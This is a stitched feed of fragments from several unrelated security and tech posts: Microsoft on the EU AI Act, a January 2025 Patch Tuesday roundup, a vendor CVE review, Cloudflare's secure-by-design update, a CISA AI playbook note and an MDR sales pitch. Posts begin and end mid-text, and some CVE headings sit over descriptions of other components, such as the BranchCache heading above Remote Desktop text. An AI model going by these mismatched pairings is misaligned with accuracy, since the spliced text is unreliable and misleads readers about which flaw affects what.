&lt;p&gt;Our customers also have a key role to play in these implementation efforts. By engaging with policymakers and industry groups to understand the evolving requirements and have a say on them, our customers have the opportunity to contribute their valuable insights and help shape implementation practices that better reflect their circumstances and needs, recognizing the broad range of organizations in Europe that are energized by the opportunity to innovate and grow with AI. In the coming months, a key question to be resolved is when organizations that substantially fine-tune AI models become downstream providers due to comply with general-purpose AI model obligations in August.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="going-forward"&gt;Going forward&amp;nbsp;&lt;/h3&gt;



&lt;p&gt;Microsoft will continue to make significant product, tooling, and governance investments to help our customers innovate with AI in line with new laws like the EU AI Act. Implementation practices that are efficient, effective, and interoperable internationally are going to be key to supporting useful and trustworthy innovation on a global scale, so we will continue to lean into regulatory processes in Europe and around the world. We are excited to see the projects that animated our Microsoft AI Tour events in Brussels, Paris, and Berlin improve people’s lives and earn their trust, and we welcome feedback on how we can continue to support our customers in their efforts to comply with new laws like the EU AI Act.&amp;nbsp;&lt;/p&gt;

Redmond&amp;#8217;s inaugural Patch Tuesday of 2025 bundles more fixes than the company has shipped in one go since 2017.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-60331" height="496" src="https://krebsonsecurity.com/wp-content/uploads/2022/07/winupdatedate.png" width="749" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rapid7&lt;/strong&gt;&amp;#8216;s &lt;strong&gt;Adam Barnett&lt;/strong&gt; says January marks the fourth consecutive month where Microsoft has published zero-day vulnerabilities on Patch Tuesday without evaluating any of them as critical severity at time of publication. Today also saw the publication of nine critical remote code execution (RCE) vulnerabilities.&lt;/p&gt;
&lt;p&gt;The Microsoft flaws already seeing active attacks include &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21333" rel="noopener" target="_blank"&gt;CVE-2025-21333&lt;/a&gt;, &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21334" rel="noopener" target="_blank"&gt;CVE-2025-21334&lt;/a&gt; and, you guessed it&amp;#8211; &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21335" rel="noopener" target="_blank"&gt;CVE-2025-21335&lt;/a&gt;. These are sequential because all reside in &lt;strong&gt;Windows Hyper-V&lt;/strong&gt;, a component that is heavily embedded in modern &lt;strong&gt;Windows 11&lt;/strong&gt; operating systems and used for security features including device guard and credential guard.&lt;/p&gt;
&lt;p&gt;Tenable&amp;#8217;s &lt;strong&gt;Satnam Narang&lt;/strong&gt; says little is known about the in-the-wild exploitation of these flaws, apart from the fact that they are all &amp;#8220;privilege escalation&amp;#8221; vulnerabilities. Narang said we tend to see a lot of elevation of privilege bugs exploited in the wild as zero-days in Patch Tuesday because it&amp;#8217;s not always initial access to a system that&amp;#8217;s a challenge for attackers as they have various avenues in their pursuit.&lt;/p&gt;
&lt;p&gt;&amp;#8220;As elevation of privilege bugs, they’re being used as part of post-compromise activity, where an attacker has already accessed a target system,&amp;#8221; he said. &amp;#8220;It&amp;#8217;s kind of like if an attacker is able to enter a secure building, they’re unable to access more secure parts of the facility because they have to prove that they have clearance. In this case, they’re able to trick the system into believing they should have clearance.&amp;#8221;&lt;span id="more-70070"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Several bugs addressed today earned CVSS (threat rating) scores of 9.8 out of a possible 10, including &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21298" rel="noopener" target="_blank"&gt;CVE-2025-21298&lt;/a&gt;, a weakness in Windows that could allow attackers to run arbitrary code by getting a target to open a malicious &lt;strong&gt;.rtf&lt;/strong&gt; file, documents typically opened on Office applications like Microsoft Word. Microsoft has rated this flaw &amp;#8220;exploitation more likely.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ben Hopkins&lt;/strong&gt; at &lt;strong&gt;Immersive Labs&lt;/strong&gt; called attention to the &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21311" rel="noopener" target="_blank"&gt;CVE-2025-21311&lt;/a&gt;, a 9.8 &amp;#8220;critical&amp;#8221; bug in &lt;strong&gt;Windows NTLMv1&lt;/strong&gt; (NT LAN Manager version 1), an older Microsoft authentication protocol that is still used by many organizations.&lt;/p&gt;
&lt;p&gt;&amp;#8220;What makes this vulnerability so impactful is the fact that it is remotely exploitable, so attackers can reach the compromised machine(s) over the internet, and the attacker does not need significant knowledge or skills to achieve repeatable success with the same payload across any vulnerable component,&amp;#8221; Hopkins wrote.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kev Breen&lt;/strong&gt; at Immersive points to an interesting flaw (&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21210" rel="noopener" target="_blank"&gt;CVE-2025-21210&lt;/a&gt;) that Microsoft fixed in its full disk encryption suite &lt;strong&gt;Bitlocker&lt;/strong&gt; that the software giant has dubbed &amp;#8220;exploitation more likely.&amp;#8221; Specifically, this bug holds out the possibility that in some situations the hibernation image created when one closes the laptop lid on an open Windows session may not be fully encrypted and could be recovered in plain text.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Hibernation images are used when a laptop goes to sleep and contains the contents that were stored in RAM at the moment the device powered down,&amp;#8221; Breen noted. &amp;#8220;This presents a significant potential impact as RAM can contain sensitive data (such as passwords, credentials and PII) that may have been in open documents or browser sessions and can all be recovered with free tools from hibernation files.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Tenable&amp;#8217;s Narang also highlighted a trio of vulnerabilities in &lt;strong&gt;Microsoft Access&lt;/strong&gt; fixed this month and credited to Unpatched.ai, a security research effort that is aided by artificial intelligence looking for vulnerabilities in code. Tracked as &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21186" rel="noopener" target="_blank"&gt;CVE-2025-21186&lt;/a&gt;, &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21366" rel="noopener" target="_blank"&gt;CVE-2025-21366&lt;/a&gt;, and &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21395" rel="noopener" target="_blank"&gt;CVE-2025-21395&lt;/a&gt;, these are remote code execution bugs that are exploitable if an attacker convinces a target to download and run a malicious file through social engineering. Unpatched.ai was also credited with discovering a flaw in the December 2024 Patch Tuesday release (&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-49142" rel="noopener" target="_blank"&gt;CVE-2024-49142&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&amp;#8220;Automated vulnerability detection using AI has garnered a lot of attention recently, so it’s noteworthy to see this service being credited with finding bugs in Microsoft products,&amp;#8221; Narang observed. &amp;#8220;It may be the first of many in 2025.&amp;#8221;&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re a Windows user who has automatic updates turned off and haven&amp;#8217;t updated in a while, it&amp;#8217;s probably time to play catch up. Please consider backing up important files and/or the entire hard drive before updating. And if you run into any problems installing this month&amp;#8217;s patch batch, drop a line in the comments below, please.&lt;/p&gt;

&lt;p&gt;Windows Hyper-V NT Kernel Integration VSP refers to the Virtualization Service Provider component within the Hyper-V virtualization platform on Windows. The tool acts as a bridge between the Hyper-V hypervisor and the Windows NT kernel, allowing seamless communication and management of virtual machines running on the host system.&lt;/p&gt;



&lt;p&gt;Successful exploitation of the vulnerability could allow an attacker to SYTEM privileges.&lt;/p&gt;



&lt;p&gt;CISA added the CVE-2025-21333, CVE-2025-21334, &amp;amp; CVE-2025-21335 to the &lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" rel="noreferrer noopener" target="_blank"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, acknowledging its active exploitation. CISA urged users to patch the vulnerability before February 4, 2025.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21366" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21366&lt;/a&gt;, &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21395" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21395&lt;/a&gt;, &amp;amp; &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21186" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21186&lt;/a&gt;: Microsoft Access Remote Code Execution Vulnerability&lt;/h3&gt;



&lt;p&gt;Microsoft Access is a database management system (DBMS) that helps users store, organize, and analyze data. Microsoft Access stores data in its format, or it can import or link to data from other applications.&lt;/p&gt;



&lt;p&gt;Microsoft addressed the vulnerabilities by blocking access to the following extensions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;accdb&lt;/li&gt;



&lt;li&gt;accde&lt;/li&gt;



&lt;li&gt;accdw&lt;/li&gt;



&lt;li&gt;accdt&lt;/li&gt;



&lt;li&gt;accda&lt;/li&gt;



&lt;li&gt;accdr&lt;/li&gt;



&lt;li&gt;accdu&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21275" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21275: Windows App Package Installer Elevation of Privilege Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;A Windows App Package Installer, often called App Installer, is a built-in component of the Windows operating system that allows users to install applications easily.&lt;/p&gt;

&lt;p&gt;Windows themes are a combination of colors, sounds, and pictures that you can use to personalize your Windows PC.&lt;/p&gt;



&lt;p&gt;Successful exploitation of the vulnerability requires an attacker to convince the user to load a malicious file onto a vulnerable system.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="critical-severity-vulnerabilities-patched-in-january-patch-tuesday-edition"&gt;Critical Severity Vulnerabilities Patched in January Patch Tuesday Edition&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21294" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21294: Microsoft Digest Authentication Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;Microsoft Digest Authentication is a security mechanism that uses a challenge-response protocol to verify user credentials without sending the actual password in plain text over the network.&lt;/p&gt;



&lt;p&gt;An attacker must win a race condition to exploit the vulnerability. An attacker could exploit this vulnerability by connecting to a system that requires digest authentication. This will trigger the race condition to create a use-after-free scenario, leading to arbitrary code execution.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21295" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21295: SPNEGO Extended Negotiation (NEGOEX) Security Mechanism Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;SPNEGO Extended Negotiation (NEGOEX) is a security mechanism that extends the Simple and Protected GSSAPI Negotiation Mechanism (SPNEGO) capabilities. The mechanism allows clients and servers to negotiate a standard authentication protocol based on additional metadata like trust configurations.&lt;/p&gt;



&lt;p&gt;An attacker must manipulate system operations in a specific manner to exploit the vulnerability. Upon successful exploitation, an attacker could achieve remote code execution without user interaction.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21296" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21296: BranchCache Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Windows Remote Desktop Services (RDS) is a Microsoft feature that allows users to access and control a remote computer&amp;#8217;s desktop and applications over a network connection.&lt;/p&gt;



&lt;p&gt;An attacker must win a race condition to exploit the vulnerabilities. An attacker could exploit these vulnerabilities by connecting to a system with the Remote Desktop Gateway role. Then, it would trigger the race condition to create a use-after-free scenario, ultimately leading to arbitrary code execution.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21298" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21298: Windows OLE Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;Object Linking and Embedding (OLE) is a Microsoft Windows standard that allows users to create and edit documents that contain objects from multiple applications.&lt;/p&gt;



&lt;p&gt;An attacker may exploit the vulnerability in an email attack scenario by sending a specially crafted email to the victim. The victim must open a specially crafted email with an affected Microsoft Outlook software version for successful exploitation. Upon successful exploitation, an attacker can achieve remote code execution on the victim&amp;#8217;s machine.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21307" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21307: Windows Reliable Multicast Transport Driver (RMCAST) Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;The Windows Reliable Multicast Transport Driver (RMCAST) is a component within the Windows operating system that enables reliable multicast data transmission.&lt;/p&gt;



&lt;p&gt;An unauthenticated attacker could exploit the vulnerability by sending specially crafted packets to a Windows Pragmatic General Multicast (PGM) open socket on the server without any interaction from the user.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21311" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21311: Windows NTLM V1 Elevation of Privilege Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;Windows NTLM V1 (NT LAN Manager Version 1) is a Microsoft authentication protocol used for network logins on Windows systems.&lt;/p&gt;



&lt;p&gt;Successful exploration of the vulnerability could allow an attacker to escalate privileges.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21354" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21354&lt;/a&gt; &amp;amp; &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21362" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-21362&lt;/a&gt;: Microsoft Excel Remote Code Execution Vulnerability&lt;/h3&gt;



&lt;p&gt;Microsoft Excel is a spreadsheet program that helps users organize and analyze data. It&amp;#8217;s available on Windows, macOS, Android, iOS, and iPadOS.&lt;/p&gt;



&lt;p&gt;Successful exploitation of the vulnerability could allow an attacker to achieve remote code execution of vulnerable targets.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="other-microsoft-vulnerability-highlights"&gt;Other Microsoft Vulnerability Highlights&lt;/h2&gt;

&lt;h2 class="wp-block-heading" id="evaluate-vendor-suggested-mitigation-with-policy-compliance-pc"&gt;EVALUATE Vendor-Suggested Mitigation with &lt;a href="https://www.qualys.com/forms/policy-compliance/" rel="noreferrer noopener" target="_blank"&gt;Policy Compliance (PC)&lt;/a&gt;&lt;/h2&gt;



&lt;p&gt;With Qualys Policy Compliance&amp;#8217;s Out-of-the-Box Mitigation or Compensatory Controls reduce the risk of a vulnerability being exploited because the remediation (fix/Patch) cannot be done now. These security controls are not recommended by industry standards such as CIS, DISA-STIG.&lt;/p&gt;



&lt;p&gt;Qualys Policy Compliance team releases these exclusive controls based on Vendor-suggested Mitigation/Workaround.&lt;/p&gt;



&lt;p&gt;Mitigation refers to a setting, common configuration, or general best-practice existing in a default state that could reduce the severity of exploitation of a vulnerability.&lt;/p&gt;



&lt;p&gt;A workaround is a method, sometimes used temporarily, for achieving a task or goal when the usual or planned method isn&amp;#8217;t working. Information technology often uses a workaround to overcome hardware, programming, or communication problems. Once a problem is fixed, a workaround is usually abandoned.&lt;/p&gt;

In line with this, we're reducing the prevalence of vulnerability classes across our products.</description><content:encoded>&lt;p&gt;In today’s rapidly evolving digital landscape, securing software systems has never been more critical. Cyber threats continue to exploit systemic vulnerabilities in widely used technologies, leading to widespread damage and disruption. That said, the &lt;a href="https://www.cisa.gov/"&gt;&lt;u&gt;United States Cybersecurity and Infrastructure Agency (CISA)&lt;/u&gt;&lt;/a&gt; helped shape best practices for the technology industry with their &lt;a href="https://www.cisa.gov/securebydesign/pledge"&gt;&lt;u&gt;Secure-by-Design pledge&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://blog.cloudflare.com/secure-by-design-principles/"&gt;&lt;u&gt;Cloudflare signed this pledge&lt;/u&gt;&lt;/a&gt; on May 8, 2024, reinforcing our commitment to creating resilient systems where security is not just a feature, but a foundational principle.&lt;/p&gt;&lt;p&gt;We’re excited to share an update aligned with one of CISA’s goals in the pledge: &lt;i&gt;To reduce entire classes of vulnerabilities&lt;/i&gt;. This goal aligns with the Cloudflare Product Security program’s initiatives to continuously automate proactive detection and vigorously prevent vulnerabilities at scale.   &lt;/p&gt;&lt;p&gt;Cloudflare’s commitment to the CISA pledge reflects our dedication to transparency and accountability to our customers. This blog post outlines why we prioritized certain vulnerability classes, the steps we took to further eliminate vulnerabilities, and the measurable outcomes of our work.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The core philosophy that continues: prevent, not patch&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-core-philosophy-that-continues-prevent-not-patch"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare’s core security philosophy is to prevent security vulnerabilities from entering production environments. One of the goals for Cloudflare’s Product Security team is to champion this philosophy and ensure secure-by-design approaches are part of product and platform development. Over the last six months, the Product Security team aggressively added both new and customized rulesets aimed at completely eliminating secrets and injection code vulnerabilities. These efforts have enhanced detection precision, reducing false positives, while enabling the proactive detection and blocking of these two vulnerability classes. Cloudflare’s security practice to block vulnerabilities before they are introduced into code at merge or code changes serves to maintain a high security posture and aligns with CISA’s pledge around proactive security measures.&lt;/p&gt;&lt;p&gt;Injection vulnerabilities are a critical vulnerability class, irrespective of the product or platform. These occur when code and data are improperly mixed due to lack of clear boundaries as a result of inadequate validation, unsafe functions, and/or improper sanitization. Injection vulnerabilities are considered high impact as they lead to compromise of confidentiality, integrity, and availability of the systems involved. Some of the ways Cloudflare continuously detects and prevents these risks is through security reviews, secure code scanning, and vulnerability testing. Additionally, ongoing efforts to institute improved precision serve to reduce false positives and aggressively detect and block these vulnerabilities at the source if engineers accidentally introduce these into code.&lt;/p&gt;&lt;p&gt;Secrets in code is another vulnerability class of high impact, as it presents significant risk related to confidential information leaks, potentially leading to unauthorized access and insider threat challenges. In 2023, Cloudflare prioritized tuning our security tools and systems to further improve the detection and reduction of secrets within code. Through audits and usage patterns analysis across all Cloudflare repositories, we further decreased the probability of the reintroduction of these vulnerabilities into new code by writing and enabling enhanced secrets detection rules.&lt;/p&gt;&lt;p&gt;Cloudflare is committed to elimination of these vulnerability classes regardless of their criticality. By addressing these vulnerabilities at their source, Cloudflare has significantly reduced the attack surface and the potential for exploitation in production environments. This approach established secure defaults by enabling developers to rely on frameworks and tools that inherently separate data or secrets from code, minimizing the need for reactive fixes. Additionally, resolving these vulnerabilities at the code level “future-proofs” applications, ensuring they remain resilient as the threat landscape evolves. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cloudflare’s techniques for addressing these vulnerabilities&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflares-techniques-for-addressing-these-vulnerabilities"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;To address both injection and embedded secrets vulnerabilities, Cloudflare focused on building secure defaults, leveraging automation, and empowering developers. To establish secure default configurations, Cloudflare uses frameworks designed to inherently separate data from code. We also increased reliance on secure storage systems and secret management tools, integrating them seamlessly into the development pipeline.&lt;/p&gt;&lt;p&gt;&lt;i&gt;Continuous automation played a critical role in our strategy.&lt;/i&gt; Static analysis tools integration with DevOps process were enhanced with customized rule sets to block issues based on observed patterns and trends. Additionally, along with security scans running on every pull and merge request, software quality assurance measures of “build break”  and “stop the code” were enforced. This prevented risks from entering production when true positive vulnerabilities were detected across all Cloudflare development activities, irrespective of criticality and impacted product. This proactive approach has further reduced the likelihood of these vulnerabilities reaching production environments. &lt;/p&gt;&lt;p&gt;&lt;i&gt;Developer enablement was another key pillar&lt;/i&gt;. Priority was placed on bolstering existing continuous education and training for engineering teams by providing additional guidance and best practices on preventing security vulnerabilities, and leveraging our centralized secrets platform in an automated way. Embedding these principles into daily workflows has fostered a culture of shared responsibility for security across the organization.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The role of custom rulesets and “build break” &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-role-of-custom-rulesets-and-build-break"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;To operationalize the more aggressive detection and blocking capabilities, Cloudflare’s Product Security team wrote new detection rulesets for its &lt;a href="https://en.wikipedia.org/wiki/Static_application_security_testing"&gt;&lt;u&gt;static application security testing (SAST)&lt;/u&gt;&lt;/a&gt; tool integrated in CI/CD workflows and hardened the security criteria for code releases to production. Using the SAST tooling with both default and custom rulesets allows the security team to perform comprehensive scans for secure code, secrets, and software supply chain vulnerabilities, virtually eliminating injection vulnerabilities and secrets from source code. It also enables the security team to identify and address issues early while systematically enforcing security policies.&lt;/p&gt;&lt;p&gt;Cloudflare’s expansion of the security tool suite played a critical role in the company’s secure product strategy. Initially, rules were enabled in “monitoring only” mode to understand trends and potential false positives. Then rules were fine-tuned to enforce and adjust priorities without disrupting development workflows. Leveraging internal threat models, the team writes custom rules tailored to Cloudflare’s infrastructure. Every &lt;a href="https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests"&gt;&lt;u&gt;pull request (PR)&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://github.com/diffblue/gitlab/blob/master/doc/user/project/merge_requests/creating_merge_requests.md"&gt;&lt;u&gt;merge request (MR)&lt;/u&gt;&lt;/a&gt; was scanned against these specific rule sets, including those targeting injection and secrets. The fine-tuned rules, optimized for high precision, are then activated in blocking mode, which leads to breaking the build when detected. This process provides vulnerability remediation at the PR/MR stage.&lt;/p&gt;&lt;p&gt;Hardening these security checks directly into the CI/CD pipeline enforces a proactive security assurance strategy in the development lifecycle. This approach ensures vulnerabilities are detected and addressed early in the development process before reaching production. The detection and blocking of these issues early reduces remediation efforts, minimizes risk, and strengthens the overall security of our products and systems.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Outcomes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#outcomes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare continues to follow a culture of transparency as it provides increased visibility into the root cause of an issue and consequently allowing us to improve the process/product at scale. As a result, these efforts have yielded tangible results and continue to strengthen the security posture of all Cloudflare products.&lt;/p&gt;&lt;p&gt;In the second half of 2024, the team aggressively added new rulesets that helped detect and remove new secrets introduced into code repositories. This led to a 79% reduction of secrets in code over the previous quarter, underscoring Cloudflare’s commitment to safeguarding the company's codebase and protecting sensitive information. Following a similar approach, the team also introduced new rulesets in blocking mode, irrespective of the criticality level for all injection vulnerabilities. These improvements led to an additional 44% reduction of potential SQL injection and code injection vulnerabilities.&lt;/p&gt;&lt;p&gt;While security tools may produce false positives, customized rulesets with high-confidence true positives remain a key step in order to methodically evaluate and address the findings. These reductions reflect the effectiveness of proactive security measures in reducing entire vulnerability classes at scale. &lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare will continue to mature the current practices and enforce secure-by-design principles. Some other security practices we will continue to mature include: providing secure frameworks, threat modeling at scale, integration of automated security tooling in every stage of the software development lifecycle (SDLC), and ongoing role based developer training on leading edge security standards. All of these strategies help reduce, or eliminate, entire classes of vulnerabilities.&lt;/p&gt;

The playbook provides voluntary information-sharing processes that, if adopted, can help protect organizations from emerging AI threats.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Specifically, the playbook:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Facilitates collaboration between federal agencies, private industry, international partners, and other stakeholders to raise awareness of AI cybersecurity risks and improve the resilience of AI systems.&lt;/li&gt;
&lt;li&gt;Guides JCDC partners on how to voluntarily share information related to cybersecurity incidents and vulnerabilities associated with AI systems.&lt;/li&gt;
&lt;li&gt;Delineates information-sharing protections and mechanisms.&lt;/li&gt;
&lt;li&gt;Outlines CISA’s actions upon receiving shared information.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CISA urges JCDC partners to integrate the playbook into their incident response and information-sharing processes, make iterative improvements as needed, and provide feedback to CISA through&amp;nbsp;&lt;a href="mailto:CISA.JCDC@cisa.dhs.gov"&gt;CISA.JCDC@cisa.dhs.gov&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/01/13/why-msps-must-offer-24-7-cybersecurity-protection-and-response/" rel="nofollow"&gt;Why MSPs must offer 24/7 cybersecurity protection and response — and how OpenText MDR can help&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;In today’s cyber threat landscape, good enough is no longer good enough. Cyberattacks don’t clock out at 5 PM, and neither can your security strategy. For Managed Service Providers (MSPs), offering customers 24/7 cybersecurity protection and response isn’t just a competitive advantage—it’s an essential service for business continuity, customer trust, and staying ahead of attackers.&lt;/p&gt;



&lt;p&gt;But delivering round-the-clock security coverage is easier said than done. It requires the right tools, expertise, and scale. This is why partnering with OpenText for offering managed detection and response (MDR) can help MSPs deliver on this critical need without overburdening their resources.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;The case for 24/7 cybersecurity protection&lt;/h2&gt;



&lt;p&gt;Let’s face it: the cyber threat landscape is relentless, and the game is changing fast. Small and medium-sized businesses (SMBs) make up the core customer base for MSPs and are often top targets for cyberattacks. Cybercriminals see SMBs as easier to exploit—with fewer resources for advanced defenses and treasure troves of valuable data.&lt;/p&gt;



&lt;p&gt;But what makes the modern threat landscape even more dangerous is the speed and sophistication with which cybercriminals operate. Attackers are no longer lone actors poking at vulnerabilities. They are part of well-funded by rogue nations, highly organized operations using advanced techniques, automation, and artificial intelligence to breach systems faster than ever.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;The numbers don’t lie: &lt;/strong&gt;SMBs are the victims of &lt;strong&gt;&lt;a href="https://blog.lastpass.com/posts/why-small-businesses-are-a-target-for-cybersecurity-attacks" rel="noreferrer noopener" target="_blank"&gt;43% of cyberattacks&lt;/a&gt;&lt;/strong&gt;. And many of these attacks happen outside of business hours.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cybercrime costs are skyrocketing: &lt;/strong&gt;Global cybercrime damages are expected to hit $10.5 trillion annually by 2025, and businesses without adequate security measures &lt;a href="https://cybersecurityventures.com/hackerpocalypse-cybercrime-report-2016/#:~:text=Roughly%20one%20million%20more%20people,billion%20internet%20users%20in%202030." rel="noreferrer noopener" target="_blank"&gt;face steep financial and reputational losses&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Compliance mandates are tightening: &lt;/strong&gt;Regulations like GDPR, CCPA, and PCI DSS mean SMBs are under growing pressure to protect their sensitive data 24/7.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For MSPs, this means your customers need more than basic firewalls and endpoint protection. They need real-time monitoring, proactive threat hunting, and rapid incident response—all delivered 24/7. Anything less, and you risk leaving customers vulnerable to costly breaches.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;The challenge for MSPs: Scaling 24/7 coverage&lt;/h2&gt;



&lt;p&gt;For MSPs, managing a large number of customers, the question becomes: How do you respond in real-time to stop these lightning-fast threats before they cause irreparable damage? Providing 24/7 cybersecurity protection is no easy task for MSPs. Building an in-house security operations center (SOC) to handle threats around the clock is both costly and resource-intensive.&lt;/p&gt;



&lt;p&gt;Some common challenges include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Talent shortages: &lt;/strong&gt;The cybersecurity industry faces a well-documented skills gap, making it hard for MSPs to find and keep experienced analysts. This challenge is so widespread that 43% of MSPs cite it as their&lt;a href="https://www.datto.com/resources/dattos-global-state-of-the-msp-report-2024-infographic/" rel="noreferrer noopener" target="_blank"&gt; biggest obstacle to delivering security services&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;High costs: &lt;/strong&gt;The expense of creating an in-house SOC can be astronomical, often reaching millions. In fact, 33% of MSPs identify the overwhelming cost of needing numerous cybersecurity tools as a &lt;a href="https://www.datto.com/resources/dattos-global-state-of-the-msp-report-2024-infographic/" rel="noreferrer noopener" target="_blank"&gt;major barrier to offering security services&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Evolving threats: &lt;/strong&gt;Cybercriminals are constantly adapting and refining their attack strategies, making it essential for MSPs to stay ahead. This ongoing evolution demands continuous investment in both training for an MSP’s security team and the latest technologies to effectively detect and mitigate new types of threats.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This is where OpenText MDR comes in, empowering MSPs to deliver enterprise-grade protection without the heavy lifting of building your own in-house SOC.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Why MSPs should partner with OpenText MDR&lt;/h2&gt;



&lt;p&gt;OpenText MDR combines cutting-edge technology, human expertise, and 24/7 monitoring to help MSPs meet their customers’ growing cybersecurity demands. Here’s why OpenText MDR is the ideal solution:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;

